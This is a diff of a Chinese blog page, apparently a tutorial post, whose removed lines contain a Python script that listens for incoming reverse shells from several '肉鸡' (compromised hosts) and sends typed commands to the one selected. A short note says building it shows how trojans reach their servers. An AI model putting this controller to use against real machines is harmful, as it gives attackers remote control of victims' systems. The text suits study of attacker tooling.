-<h4 id="6-整体演示"><a href="#6-整体演示" class="headerlink" title="6.整体演示"></a>6.整体演示</h4><p><img src="/images/pasted-97.png" alt="upload successful"><br>先是代码阻塞等待连接，然后 选择ip地址，因为就是我在保存ip地址的时候吧监听的写进去了，所以出现了错误emmm，大意了。</p>
-<h4 id="整体代码"><a href="#整体代码" class="headerlink" title="整体代码"></a>整体代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 用于shell监听</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Server</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.ip = <span class="string">'192.168.0.14'</span></span><br><span class="line">        self.port = <span class="number">5555</span></span><br><span class="line">        self.shell_arr = []  <span class="comment"># 用于保存多个shell</span></span><br><span class="line">        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="literal">True</span>)</span><br><span class="line">        self.server.bind((self.ip, self.port))</span><br><span class="line">        self.server.listen(<span class="number">10</span>)</span><br><span class="line">        threading.Thread(target=self.get_shell).start()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_shell</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="string">"""监听shell"""</span></span><br><span class="line">        print(<span class="string">'** listening--listen &#123;&#125;:&#123;&#125;'</span>.format(self.ip, self.port))</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            client_socket, addr = self.server.accept()</span><br><span class="line">            <span class="comment"># 吧对象写入到字典</span></span><br><span class="line">            print(<span class="string">'\n已接收到shell'</span>)</span><br><span class="line">            self.shell_arr.append(&#123;<span class="string">'ip'</span>: self.ip, <span class="string">'shell_obj'</span>: client_socket&#125;)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">msg</span><span class="params">(self, sock)</span>:</span></span><br><span class="line">        <span class="comment"># 显示消息接收</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                user_msg = sock.recv(<span class="number">2048</span>).decode(<span class="string">'gb2312'</span>)</span><br><span class="line">                print(user_msg)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            sock.close()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(self, sock, msg)</span>:</span></span><br><span class="line">        <span class="comment"># 发送指令</span></span><br><span class="line">        msg = <span class="string">'\r\n'</span> + msg + <span class="string">'\r\n\r\n'</span></span><br><span class="line">        sock.send(msg.encode(<span class="string">'gb2312'</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Cmd</span><span class="params">(Server, threading.Thread)</span>:</span></span><br><span class="line">    <span class="comment"># 命令基础概念，多个肉鸡控制</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">                cmd = str(input(<span class="string">'mo:'</span>))</span><br><span class="line">                <span class="keyword">if</span> cmd == <span class="string">'help'</span>:</span><br><span class="line">                    self.help()  <span class="comment"># 帮助菜单</span></span><br><span class="line">                <span class="keyword">elif</span> cmd == <span class="string">'show'</span>:</span><br><span class="line">                    self.show()  <span class="comment"># 显示肉鸡</span></span><br><span class="line">                <span class="keyword">elif</span> <span class="string">'option host='</span> <span class="keyword">in</span> cmd:</span><br><span class="line">                    self.send_cmd(self.ip_processing(cmd))  <span class="comment"># 获取socket对象</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            print(Error)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'show命令可以查看肉鸡列表\n'</span></span><br><span class="line">              <span class="string">'option host=可以选中肉鸡'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'可以选择输入 option host=主机地址进行shell控制'</span>)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> self.shell_arr:</span><br><span class="line">            print(i[<span class="string">'ip'</span>])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">ip_processing</span><span class="params">(self, ip_str)</span>:</span></span><br><span class="line">        <span class="string">"""分割ip地址"""</span></span><br><span class="line">        left_index = ip_str.find(<span class="string">'='</span>)</span><br><span class="line">        <span class="comment"># 寻找该ip地址的shell信息</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> self.shell_arr:</span><br><span class="line">                <span class="keyword">if</span> i[<span class="string">'ip'</span>] == ip_str[left_index + <span class="number">1</span>:]:</span><br><span class="line">                    <span class="keyword">return</span> i[<span class="string">'shell_obj'</span>]</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> Error:</span><br><span class="line">            print(Error)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">send_cmd</span><span class="params">(self, sock)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> sock:</span><br><span class="line">            print(<span class="string">'对不起该ip地址不存在'</span>)</span><br><span class="line">            self.run()</span><br><span class="line">        <span class="comment"># 开启消息监听，因为里面是死循环消息监听，所以需要使用多线程</span></span><br><span class="line">        threading.Thread(target=self.msg, args=(sock,)).start()</span><br><span class="line">        <span class="comment"># 开启命令执行</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            command = input(<span class="string">''</span>)</span><br><span class="line">            self.send_msg(sock, command)</span><br><span class="line">            <span class="keyword">if</span> command == <span class="string">'exit'</span>:</span><br><span class="line">                self.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = Cmd()</span><br><span class="line">    server.run()</span><br></pre></td></tr></table></figure>
-
-<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>其实自己去实现一次shell获取是很有必要的，可以了解到木马连接服务器的实现</p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
   </div>
 
   
@@ -1053,7 +1058,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">31</span>
+          <span class="site-state-item-count">33</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
